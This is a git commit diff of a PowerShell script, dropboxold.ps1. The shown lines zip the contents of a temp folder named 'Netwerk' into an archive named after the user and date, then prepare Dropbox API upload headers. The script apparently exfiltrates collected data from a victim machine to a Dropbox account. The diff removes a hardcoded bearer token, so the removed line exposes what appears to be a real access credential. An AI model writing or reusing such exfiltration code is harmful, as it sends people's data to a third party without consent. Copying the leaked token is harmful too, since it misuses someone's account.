8510d5872f567c7a0aeba9abe8560cd3e735b514
thaloot <150231781+thaloot@users.noreply.github.com>
2023-12-05 17:42:25 +0100

    Update dropboxold.ps1

--- dropboxold.ps1
+++ dropboxold.ps1
@@ -6,7 +6,7 @@ Compress-Archive -Path $env:Temp\Netwerk\* -CompressionLevel NoCompression -Dest
 $TargetFilePath="/$env:USERNAME-$(get-date -f yyyy-MM-dd).zip"
 $SourceFilePath="$env:TMP\$env:USERNAME-$(get-date -f yyyy-MM-dd).zip"
 $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
-$authorization = "Bearer " + "sl.BrLZR7JfYRmmFpnKc9kSCDhf0yYQpAqpcd8a_jRGxOtZa_6viUr3IOj00M4VJGn" + "v1HRCxhGJciy2SN9H0UMjWofwJeBXpRbb9P7aKky9G02eO-f6K7qQxwDuVU1YFzaVjYuX06ucqkUA4e4"
+$authorization = "Bearer " + "" + ""
 $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
 $headers.Add("Authorization", $authorization)
 $headers.Add("Dropbox-API-Arg", $arg)
